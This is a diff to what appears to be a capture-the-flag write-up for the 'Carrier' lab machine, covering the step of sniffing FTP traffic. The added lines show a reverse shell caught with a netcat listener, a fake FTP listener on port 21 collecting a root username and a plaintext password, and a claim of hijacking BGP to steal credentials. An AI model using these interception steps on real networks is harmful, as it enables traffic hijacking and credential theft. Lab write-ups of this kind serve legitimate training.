@@ -439,14 +439,30 @@ Origin codes: i - IGP, e - EGP, ? - incomplete
 
 Total number of prefixes 27
 ```
+The prefix is successfully updated.
 
+###### Sniffing FTP traffic
 
-Start capturing FTP traffic
 ```python
 
-root@r1:~# tcpdump -A -i any port 21 -vv -w ftp.pcap    
-tcpdump -A -i any port 21 -vv -w ftp.pcap
-tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
-Got 52
+➜  carrier nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.10.105] 46636
+bash: cannot set terminal process group (25006): Inappropriate ioctl for device
+bash: no job control in this shell
+root@r1:~# nc -lvp 21
+nc -lvp 21
+Listening on [0.0.0.0] (family 0, port 21)
+Connection from [10.78.10.2] port 21 [tcp/ftp] accepted (family 2, sport 44650)
+
+USER root
+331
+PASS BGPtelc0rout1ng
 ```
-d
+Once we recive a connection to FTP server press Enter and when root USER popups enter 331. We have successfully hijacked BGP  to steal FTP credentials. 
+
+Awsome Now, we can revert the network configurations and log in to carrier with the root credentials to root.txt
+
+###### Conclusion:
+
+
